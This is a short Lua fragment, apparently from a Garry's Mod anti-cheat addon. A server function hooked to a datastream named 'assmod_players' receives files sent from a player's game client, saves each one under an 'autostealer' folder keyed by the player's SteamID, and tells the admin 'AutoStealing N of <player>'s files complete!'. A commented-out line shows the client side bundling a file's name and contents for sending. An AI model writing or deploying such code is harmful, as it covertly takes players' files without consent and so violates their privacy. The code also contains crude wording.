--table.insert(Booty, Format("%s\n%s\n===Begin Stream===\n\n%s", NewFile, (LocalPlayer():Nick() or "Fuck"), NotFR("lua/"..NewFile, true) ) )



	function HAC.GimmeRX(ply,handle,id,enc,dec)
		local num = 0
		local SID = ply:SteamID():gsub(":","_")
		local Filename = "hac_autostealer-"..SID.."/log_"..num
		local AppFile  = "hac_autostealer_log-"..SID
		
		--PrintTable( dec )
		for k,v in pairs(dec) do
			num = num + 1
			Filename = "hac_autostealer-"..SID.."/log_"..num
			
			--print("! got ")
			if file.Exists(Filename) then
				Filename = Filename.."-OTHER"
			end
			file.Write(Filename..".txt", v)
		end
		
		if file.Exists(AppFile) then --Append first log with total files that came through
			filex.Append(AppFile, "\n"..num.." files recieved!\n\n")
		end
		TellHeX("AutoStealing "..num.." of "..ply:Nick().."'s files complete!", NOTIFY_ERROR, "rmine_taunt1.wav") --GAN
	end
	datastream.Hook("assmod_players", HAC.GimmeRX)
	
	


